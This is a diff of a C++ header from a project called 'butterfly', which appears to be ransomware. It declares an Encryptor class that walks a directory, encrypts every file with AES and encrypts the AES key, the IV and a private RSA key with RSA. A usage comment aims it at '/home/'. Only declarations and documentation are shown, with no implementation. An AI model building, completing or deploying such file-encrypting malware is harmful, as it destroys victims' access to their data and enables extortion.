@@ -16,7 +16,7 @@ namespace hybrid
 {
 
 /**
- * Class Encryptor to encrypt the AES and the CPrivateRSA key
+ * Class Encryptor to encrypt all files with AES and the CPrivateRSA and AES key with RSA
  */
 class Encryptor
 {
@@ -24,7 +24,7 @@ class Encryptor
 private:
     int _keySize;
     std::string _aesKeyDbFilepath;
-    std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorAESIV, _rsaEncryptorCPrivateRSA;
+    std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorCPrivateRSA;
     std::unique_ptr<aes::AESEncryptor> _aesEncryptor;
     std::unique_ptr<DirectoryIterator> _dirIterator;
     std::unique_ptr<AESKeyDatabase> _aesKeyDatabase;
@@ -32,6 +32,13 @@ private:
 public:
     /**
      * Constructor Encryptor
+     *
+     *  Usage:
+     *       std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
+     *       encryptor->invokeDir("/home/");
+     *
+     * @param keySize: size of the key
+     * @param aesKeyDbFilepath:
      */
     explicit Encryptor(int keySize = 2048, const std::string &aesKeyDbFilepath = "/home/christian/projects/butterfly/bin/AES.db");
 
@@ -41,35 +48,32 @@ public:
     ~Encryptor();
 
     /**
+     * Invokes the provided directory path
      *
-     * @param path
+     * @param path: path of the directory
      */
-    void startWithDir(const std::string &path);
+    void invokeDir(const std::string &path);
 
     /**
-     * Encrypts the CPrivateRSA.pem and saves the bin file on the host machine
+     * Encrypts the CPrivateRSA.pem and saves the CPrivateRSA.bin file on the host machine
      */
     void encryptCPrivateRSA();
 
     /**
+     * Encrypts all files with AES
      *
-     * @param filepath
+     * @param filepath: path of the file
      */
     void encryptFileWithAES(const std::string &filepath);
 
     /**
+     * Encrypts the final AES Key and IV with RSA
      *
-     * @param data
-     * @param filename
+     * @param aesKeyStr: AES Key or IV String
+     * @param filename: name of the encrypted file
      */
-    void encryptFinalAESKeyWithRSA(const std::string &data, const std::string &filename);
+    void encryptFinalAESKeyWithRSA(const std::string &aesKeyStr, const std::string &filename);
 
-    /**
-     *
-     * @param data
-     * @param filename
-     */
-    void encryptFinalAESIVWithRSA(const std::string &data, const std::string &filename);
     void encryptAESKeyFile(const std::string &filepath);
 };
 
